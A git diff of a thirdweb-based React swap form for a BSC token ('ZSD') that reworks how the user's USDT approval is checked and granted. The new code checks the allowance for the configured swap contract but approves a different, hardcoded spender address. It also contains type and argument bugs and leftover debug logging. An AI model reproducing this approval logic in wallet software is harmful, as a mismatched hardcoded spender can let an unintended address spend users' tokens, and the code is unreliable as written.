@@ -12,14 +12,12 @@ import {
 import { useSendTransaction, useActiveAccount } from "thirdweb/react";
 import { approve, balanceOf, allowance } from "thirdweb/extensions/erc20";
 import styles from "./index.module.scss";
-
 const THIRDWEB_PROJECT_ID: any = process.env.NEXT_PUBLIC_TEMPLATE_CLIENT_ID;
 export const client = createThirdwebClient({ clientId: THIRDWEB_PROJECT_ID });
 
 // 导入API配置
 import { APIConfig } from "../../abi/APIConfiguration";
-import { bsc } from "thirdweb/chains";           //主网
-
+import { bsc } from "thirdweb/chains";
 import { USDTAbi } from "../../abi/USDTAbi";
 import { ZSDABI } from "../../abi/ZSDABI";
 import { ZSDSwapABI } from "../../abi/ZSDSwapABI";
@@ -31,10 +29,10 @@ const contractwapABI: any = ZSDSwapABI;
 const contractROJECTABI: any = ZSDPROJECTABI;
 
 //USDT
+//USDT
 const USDTContract = getContract({
   client: client,
   address: APIConfig.USDTaddress,
-  abi: USDTAbinew,
   chain: bsc,
 });
 
@@ -69,6 +67,7 @@ const Commonform = () => {
   const account: any = useActiveAccount();
   const { mutate: sendTransaction, isPending } = useSendTransaction();
   const [price, SetPrice] = useState<any>(0);
+  const [priceAccount, SetPriceAccount] = useState<any>(0);
 
 
   const selectAfterone = (
@@ -91,7 +90,6 @@ const Commonform = () => {
         params: [BigInt(1000000000000000000)],
       });
       const WeiBalance = USDtoZSDnum.toString();
-
       SetPrice(WeiBalance)
     } catch (error) {
       console.error("查询失败:", error);
@@ -99,91 +97,46 @@ const Commonform = () => {
   };
 
   const onFinish = async (values: any) => {
+    // console.log(APIConfig.ZSDSwapAddress, "Received values of form: ", account.address);
     try {
-      //*****************************************************ZSD授权USDT**************************************************** */
-      //zsd合约有权限调用用户 balance的资产
-      // const banlance: any = 10000000000000000000000000 * 10 ** 18;
-
-      // //用户将自己usdt转出banlance的权限赋予zsd合约  || 用户授权给ZSD合约可操作usdt的余额
       // const allowanceUSDTBalance = await readContract({
       //   contract: USDTContract,
-      //   method: "function allowance(address, address)",
-      //   params: [account.address, APIConfig.ZSDaddress],
-      // });
-
-      // //zsd合约有权限调用用户 balance的资产
-      // //用户将自己USDT转出banlance的权限赋予zsd合约
-      // const tx1 = prepareContractCall({
-      //   contract: USDTContract,
-      //   method: "function approve(address, uint256) returns (bool)",
-      //   params: [APIConfig.ZSDaddress, banlance],
-      // });
-      // // 用户将usdt转给zsd合约
-      // const tx1Result = await sendAndConfirmTransaction({
-      //   transaction: tx1,
-      //   account: account,
-      // });
-      // console.log("USDT transfer successful:", tx1Result);
-
-
-      //*****************************************************USDT授权zsd**************************************************** */
-      // const banlanceUSDT: any = 10000000000000000000000000 * 10 ** 18;
-      // const allowanceUSDTBalanceUSDT = await readContract({
-      //   contract: ZSDContract,
-      //   method: "function allowance(address, address)",
-      //   params: [account.address, APIConfig.USDTaddress],
-      // });
-      // const tx1usdt = prepareContractCall({
-      //   contract: ZSDContract,
-      //   method: "function approve(address, uint256) returns (bool)",
-      //   params: [APIConfig.USDTaddress, banlanceUSDT],
-      // });
-      // const tx1Resultusdt = await sendAndConfirmTransaction({
-      //   transaction: tx1,
-      //   account: account,
-      // });
-      // console.log("USDT transfer successful:", tx1Resultusdt);
-
-      //*****************************************************ZSDPROJECT授权zsd**************************************************** */
-      // const banlanceZSDPROJECT: any = 10000000000000000000000000 * 10 ** 18;
-
-      // const allowanceUSDTBalanceZSDPROJECT = await readContract({
-      //   contract: ZSDSWAPContract,
-      //   method: "function allowance(address, address)",
+      //   method: "function allowance(address, address) returns(uint256)",
       //   params: [account.address, APIConfig.ZSDSwapAddress],
       // });
+      const banlance: any = 10000000000;
+      const allowanceUSDTBalance = await allowance({
+        contract: USDTContract,
+        owner: account.address,
+        spender: APIConfig.ZSDSwapAddress
+      });
+      console.log(allowanceUSDTBalance.toString(), '================');
 
-      // const tx1ZSDPROJECT = prepareContractCall({
-      //   contract: ZSDSWAPContract,
-      //   method: "function approve(address, uint256) returns (bool)",
-      //   params: [APIConfig.ZSDSwapAddress, banlanceZSDPROJECT],
-      // });
+      if (allowanceUSDTBalance.toString() <= banlance) {
+        //zsd合约有权限调用用户 balance的资产
+        //用户将自己的 将自己usdt转出banlance的权限赋予zsd合约
+        // const tx1 = prepareContractCall({
+        //   contract: USDTContract,
+        //   method: "function approve(address, uint256) returns (bool)",
+        //   params: [APIConfig.ZSDSwapAddress, banlance],
+        // });
 
-      // const tx1ResultZSDPROJECT = await sendAndConfirmTransaction({
-      //   transaction: tx1,
-      //   account: account,
-      // });
-      // console.log("USDT transfer successful:", tx1Resultusdt);
+        const transaction = await approve({
+          contract: USDTContract,
+          spender: '0x1b4a03f2f80d842b28582252ab9b1d32a4840400',
+          amount: banlance,
+        });
 
-      //*****************************************************ZSDPROJECT授权zsd**************************************************** */
-      // const banlanceZSDPROJECTContract: any = 10000000000000000000000000 * 10 ** 18;
-      // const allowanceUSDTBalanceZSDPROJECTContract = await readContract({
-      //   contract: ZSDSWAPContract,
-      //   method: "function allowance(address, address)",
-      //   params: [account.address, APIConfig.ZSDPROJECTAddress],
-      // });
-      // const tx1ZSDZSDPROJECTContract = prepareContractCall({
-      //   contract: ZSDSWAPContract,
-      //   method: "function approve(address, uint256) returns (bool)",
-      //   params: [APIConfig.ZSDPROJECTAddress, banlanceZSDPROJECTContract],
-      // });
-      // const tx1ResultZSDPROJECTContract = await sendAndConfirmTransaction({
-      //   transaction: tx1,
-      //   account: account,
-      // });
-      // console.log("USDT transfer successful:", tx1ResultZSDPROJECTContract);
+        // 用户将usdt转给zsd合约
+        const tx1Result = await sendAndConfirmTransaction({
+          transaction: transaction,
+          account: account.address,
+        });
+        return;
+      }
 
 
+      console.log('11111111111111111111')
       // 兑换
       const transaction = prepareContractCall({
         contract: ZSDSWAPContract,
@@ -192,6 +145,7 @@ const Commonform = () => {
       });
       const result = await sendTransaction(transaction);
 
+      console.log(result, 'resultresultresult');
     } catch (error) {
       console.error("Failed to withdraw USDT:", error);
     }
@@ -209,6 +163,14 @@ const Commonform = () => {
     }
     return Promise.resolve();
   };
+
+
+  useEffect(() => {
+    if (account) {
+      SetPriceAccount(account.address)
+    }
+  }, [account]);
+
 
   useEffect(() => {
     USDtoZSDnumFun()
